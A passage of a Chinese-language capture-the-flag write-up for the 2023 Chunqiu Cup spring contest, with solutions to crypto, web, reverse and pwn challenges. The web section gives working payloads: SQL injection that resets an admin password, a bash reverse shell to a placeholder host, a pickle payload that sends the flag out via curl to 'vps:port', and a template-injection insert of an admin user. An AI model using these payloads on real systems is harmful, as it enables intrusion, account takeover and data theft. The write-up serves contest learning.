class="keyword">continue</span></span><br><span class="line">    res[i] = <span class="built_in">int</span>(res[i]) % p</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">fangcheng = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">430</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">430</span>):</span><br><span class="line">    fangcheng[i] = res[i] - <span class="built_in">int</span>(<span class="built_in">list</span>(hint)[i])</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">juzhen = [[<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">429</span>)]</span><br><span class="line">www = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">429</span>)]</span><br><span class="line"><span class="keyword">for</span> equa <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">429</span>):</span><br><span class="line">    tmp = <span class="built_in">list</span>(fangcheng[equa])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(tmp[i][<span class="number">1</span>])) &gt; <span class="number">1</span>:</span><br><span class="line">            juzhen[equa][<span class="built_in">int</span>(<span class="built_in">str</span>(tmp[i][<span class="number">1</span>])[<span class="number">1</span>:])] = tmp[i][<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            www[equa] = tmp[i][<span class="number">0</span>]</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">A = Matrix(Zmod(p),juzhen)</span><br><span class="line">enc = <span class="built_in">bytes</span>.fromhex(enc)</span><br></pre></td></tr></table></figure>
<p>最后</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> (A.solve_right(vector(Zmod(p),www))):</span><br><span class="line">    <span class="built_in">print</span>((<span class="built_in">int</span>(x) % <span class="built_in">int</span>(p))-p)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="number">275609957223526193497841020687316070508</span>)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(key))</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key=key, iv=<span class="built_in">bytes</span>(<span class="built_in">range</span>(<span class="number">16</span>)), mode=AES.MODE_CBC)</span><br><span class="line">mm = cipher.decrypt(enc)</span><br><span class="line"><span class="comment"># enc = cipher.encrypt(pad(secret.flag, 16)).hex()</span></span><br><span class="line"><span class="comment">#b&#x27;flag&#123;182273bd-61f2-7147-acd8-d571de11bb40&#125;\x06\x06\x06\x06\x06\x06&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2>
<h3 id="phpstudy"><a class="markdownIt-Anchor" href="#phpstudy"></a> phpstudy</h3>
<p>正常访问连接是404，大概率猜测是缺少HTTP head</p>
<p>尝试发现是<code>X-Requested-With: XMLHttpRequest</code></p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449545916849.png" alt="img"></p>
<p>尝试弱口令登录，admin/123456,密码错误</p>
<p>好的，找一下框架漏洞，找到一篇：<a target="_blank" rel="noopener" href="https://juejin.cn/post/7218080084141719612">小皮1-click漏洞的代码审计学习笔记 - 掘金 (juejin.cn)</a></p>
<p>跟着复现看看，确定为这个漏洞，首先登录界面的没有任何过滤的SQL注入漏洞</p>
<p>存在用户admin，直接更新该用户的账户密码，计算一下password为123456的五次md5的加密值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;123456&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">5</span>):    </span><br><span class="line">    <span class="built_in">str</span> = hashlib.md5(<span class="built_in">str</span>.encode()).hexdigest()</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line"><span class="comment">#c26be8aaf53b15054896983b43eb6a65</span></span><br></pre></td></tr></table></figure>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;;<span class="keyword">UPDATE</span> ADMINS <span class="keyword">set</span> <span class="keyword">PASSWORD</span> = <span class="string">&#x27;c26be8aaf53b15054896983b43eb6a65&#x27;</span> <span class="keyword">where</span> username = <span class="string">&#x27;admin&#x27;</span>;--</span><br></pre></td></tr></table></figure>
<p>注入以后，直接admin/123456登录，登录成功</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449551146052.png" alt="img"></p>
<p>计划任务添加任务，编写反弹shell，<code>bash -i &gt;&amp; /dev/tcp/xxxx.xxx/xxxx 0&gt;&amp;1</code></p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449552577655.png" alt="img"></p>
<p>执行任务，vps记得先监听相应端口，获取shell</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449553487758.png" alt="img"></p>
<p>flag在根目录，直接读就行</p>
<h3 id="easypy"><a class="markdownIt-Anchor" href="#easypy"></a> easypy</h3>
<p>www.zip源码泄露，在线反编译pyc文件<a target="_blank" rel="noopener" href="https://tool.lu/pyc/">python反编译 - 在线工具 (tool.lu)</a></p>
<p>获得源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.9.0</span></span><br><span class="line"><span class="comment"># Python bytecode version base 3.8.0 (3413)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.6.12 (default, Feb  9 2021, 09:19:15) </span></span><br><span class="line"><span class="comment"># [GCC 8.3.0]</span></span><br><span class="line"><span class="comment"># Embedded file name: app.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2023-04-16 15:41:59</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 1030 bytes</span></span><br><span class="line"><span class="keyword">import</span> numpy, base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;小p想要找一个女朋友，你能帮他找找看么？&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/girlfriends&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">girlfriends</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;data&#x27;</span>):</span><br><span class="line">        data = request.values.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">        numpydata = base64.b64decode(data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> numpydata <span class="keyword">or</span> <span class="string">b&#x27;bash&#x27;</span> <span class="keyword">in</span> numpydata <span class="keyword">or</span> <span class="string">b&#x27;sh&#x27;</span> <span class="keyword">in</span> numpydata:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;不能走捷径啊&#x27;</span></span><br><span class="line">        resp = numpy.loads(numpydata)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;可以的，要的就是一种感觉&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;有进步了,但是不多&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;www.zip&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> (f):</span><br><span class="line">        stream = f.read()</span><br><span class="line">    response = Response(stream, content_type=<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">    response.headers[<span class="string">&#x27;Content-disposition&#x27;</span>] = <span class="string">&#x27;attachment;filename=www.zip&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
<p>简单看一下过滤规则，就是data传入ssti注入链之后base64解码，存在’R’、‘bash’、‘sh’，就只是简单的不希望你反弹shell或者是命令执行，绕过方法很简单。</p>
<p>curl外带flag即可，使用i指令：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">data=<span class="string">b&#x27;&#x27;&#x27;(S&#x27;curl vps:port/`cat /f*`&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(data))</span><br></pre></td></tr></table></figure>
<p>记得提前开启端口监听：</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449612872961.png" alt="img"></p>
<h3 id="ezrust"><a class="markdownIt-Anchor" href="#ezrust"></a> ezrust</h3>
<p>简单看看源码：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> actix_files::NamedFile;</span><br><span class="line"><span class="keyword">use</span> actix_web::&#123;App, HttpRequest, HttpResponse, HttpServer, Responder, <span class="type">Result</span>, web, get, post, guard&#125;;</span><br><span class="line"><span class="keyword">use</span> std::path::PathBuf;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">index</span>(req: HttpRequest) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;NamedFile&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">path</span>: PathBuf = req.<span class="title function_ invoke__">match_info</span>().<span class="title function_ invoke__">query</span>(<span class="string">&quot;filename&quot;</span>).<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">if</span> path.<span class="title function_ invoke__">to_str</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;REASON&quot;</span>).<span class="title function_ invoke__">to_string</span>().<span class="title function_ invoke__">contains</span>(<span class="string">&quot;p&quot;</span>) &#123;</span><br><span class="line">        path = PathBuf::<span class="title function_ invoke__">from</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(NamedFile::<span class="title function_ invoke__">open</span>(path)?)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[get(<span class="string">&quot;/&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">hello</span>() <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Responder</span> &#123;</span><br><span class="line">    HttpResponse::<span class="title function_ invoke__">Ok</span>().<span class="title function_ invoke__">body</span>(<span class="string">&quot;Hello world!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[get(<span class="string">&quot;/&#123;name&#125;&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">name</span>(path: web::Path&lt;(<span class="type">String</span>)&gt;) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;<span class="type">String</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">name</span> = path.<span class="title function_ invoke__">into_inner</span>();</span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(<span class="built_in">format!</span>(<span class="string">&quot;Welcome &#123;&#125;!&quot;</span>, name))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#[actix_web::main]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() <span class="punctuation">-&gt;</span> std::io::<span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">    HttpServer::<span class="title function_ invoke__">new</span>(|| &#123;</span><br><span class="line">        App::<span class="title function_ invoke__">new</span>()</span><br><span class="line">            .<span class="title function_ invoke__">service</span>(hello)</span><br><span class="line">            .<span class="title function_ invoke__">service</span>(name)</span><br><span class="line">            .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/&#123;filename:.*&#125;&quot;</span>, web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(index))</span><br><span class="line">    &#125;)</span><br><span class="line">        .<span class="title function_ invoke__">bind</span>((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8000</span>))?</span><br><span class="line">        .<span class="title function_ invoke__">run</span>()</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重点看一下这一段</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">index</span>(req: HttpRequest) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;NamedFile&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">path</span>: PathBuf = req.<span class="title function_ invoke__">match_info</span>().<span class="title function_ invoke__">query</span>(<span class="string">&quot;filename&quot;</span>).<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">if</span> path.<span class="title function_ invoke__">to_str</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;REASON&quot;</span>).<span class="title function_ invoke__">to_string</span>().<span class="title function_ invoke__">contains</span>(<span class="string">&quot;p&quot;</span>) &#123;</span><br><span class="line">        path = PathBuf::<span class="title function_ invoke__">from</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(NamedFile::<span class="title function_ invoke__">open</span>(path)?)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里主要使用的是open()函数，用来读取指定路径下的文件，根据题目提示</p>
<p>flag在work目录下，结合自己搭建vue框架的经历，锁定flag就在当前目录</p>
<p>直接<code>url/./flag</code>获取flag</p>
<h3 id="qqcms"><a class="markdownIt-Anchor" href="#qqcms"></a> qqcms</h3>
<p>search存在注入点，<code>ssti+sql</code></p>
<p>sql修改管理员密码为123456</p>
<p>payload：</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="keyword">loop</span> sql=<span class="symbol">&#x27;INSERT</span> INTO qc_user VALUES (<span class="number">666</span>, <span class="number">18888888889</span>, <span class="string">&quot;管理员&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">1</span>, <span class="string">&quot;&quot;</span>, <span class="number">2</span>, <span class="number">0.00</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1652334396</span>, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1652334410</span>, <span class="string">&quot;127.0.0.1&quot;</span>)&#x27;&#125;&#125;&#123;&#123;/<span class="keyword">loop</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>登录后台成功，目录穿越获取flag：</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449660185664.png" alt="img"></p>
<h2 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h2>
<h3 id="sum"><a class="markdownIt-Anchor" href="#sum"></a> sum</h3>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449666451467.png" alt="img"></p>
<p>进去获取数据</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449667805170.png" alt="img"></p>
<p>一眼数独，直接在线网站算<a target="_blank" rel="noopener" href="https://shudu.gwalker.cn/">https://shudu.gwalker.cn/</a></p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449669279373.jpeg" alt="img"></p>
<p>输入正确的数据之后，即可获取flag</p>
<h3 id="poisoned_tea_chell"><a class="markdownIt-Anchor" href="#poisoned_tea_chell"></a> Poisoned_tea_CHELL</h3>
<p>通过动调定位至主函数</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/image-20230519201149062.png" alt="image-20230519201149062"></p>
<p>查看check函数</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/image-20230519201256667.png" alt="image-20230519201256667"></p>
<p>↑初始化key，获取输入后进行xtea加密</p>
<p>xtea加密为仅更改魔数的加密</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/image-20230519201435273.png" alt="image-20230519201435273"></p>
<p>加密完成后进行校验</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/image-20230519201529248.png" alt="image-20230519201529248"></p>
<p>可以看出关键数据都需要通过动调获得，不过ida识别为动态库文件，所以这里通过attach进程获得</p>
<p>最终解密脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include&lt;windows.h&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">void tea(<span class="built_in">int</span> <span class="built_in">round</span>, unsigned <span class="built_in">int</span> *src, unsigned <span class="built_in">int</span> *key)</span><br><span class="line">&#123;</span><br><span class="line">    unsigned <span class="built_in">int</span> v1 = src[<span class="number">0</span>];</span><br><span class="line">    unsigned <span class="built_in">int</span> v2 = src[<span class="number">1</span>];</span><br><span class="line">    unsigned <span class="built_in">int</span> <span class="built_in">sum</span> = <span class="number">3652639132</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i=<span class="number">0</span>; i&lt;<span class="built_in">round</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v2 -= (v1 + ((v1 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v1))) ^ (key[((<span class="built_in">sum</span> &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)] + <span class="built_in">sum</span>);</span><br><span class="line">        <span class="built_in">sum</span> += <span class="number">0x41104111</span>;</span><br><span class="line">        v1 -= (v2 + ((v2 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v2))) ^ (key[(<span class="built_in">sum</span> &amp; <span class="number">3</span>)] + <span class="built_in">sum</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    src[<span class="number">0</span>] = v1;</span><br><span class="line">    src[<span class="number">1</span>] = v2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned <span class="built_in">int</span> src[<span class="number">16</span>] = &#123;</span><br><span class="line">        <span class="number">0xECFDA301</span>, <span class="number">0x61BECDF5</span>, <span class="number">0xB89E6C7D</span>, <span class="number">0xCE36DC68</span>, <span class="number">0x4B6E539E</span>, <span class="number">0x642EB504</span>, <span class="number">0x54F9D33C</span>, <span class="number">0x6D06E365</span>, </span><br><span class="line">        <span class="number">0xEA873D53</span>, <span class="number">0xA4618507</span>, <span class="number">0xD7B18E30</span>, <span class="number">0xC45B4042</span></span><br><span class="line">    &#125;;</span><br><span class="line">    unsigned <span class="built_in">int</span> key[] = &#123;<span class="number">5</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">7</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i=<span class="number">0</span>; i&lt;<span class="number">12</span>; i+=<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        tea(<span class="number">0x24</span>, &amp;src[i], key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i=<span class="number">0</span>; i&lt;<span class="number">48</span>; i+=<span class="number">1</span>)</span><br><span class="line">        printf(<span class="string">&quot;%c&quot;</span>, *((char*)src + i));</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> Pwn</h2>
<h3 id="p2048"><a class="markdownIt-Anchor" href="#p2048"></a> p2048</h3>
<p>纯玩，达成条件，顶上四格加起来为2048即可（可以手打）；</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">sh = remote(<span class="string">&#x27;47.94.224.3&#x27;</span>,<span class="number">27384</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\n&#x27;</span> * <span class="number">1200</span> + <span class="string">b&#x27;a&#x27;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive() </span><br></pre></td></tr></table></figure>
<h3 id="easy_lzhiftp_chell"><a class="markdownIt-Anchor" href="#easy_lzhiftp_chell"></a> easy_LzhiFTP_CHELL</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,\</span><br><span class="line">        log_level=<span class="string">&#x27;debug&#x27;</span>,\</span><br><span class="line">        terminal=[<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;split&quot;</span>,<span class="string">&quot;-h&quot;</span>])</span><br><span class="line">path = os.path.dirname(os.path.realpath(__file__))</span><br><span class="line"></span><br><span class="line">elf = ELF(path+<span class="string">&quot;/pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/ubuntu/tools/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(path+&quot;/pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;39.106.48.123&quot;</span>,<span class="number">37904</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name: 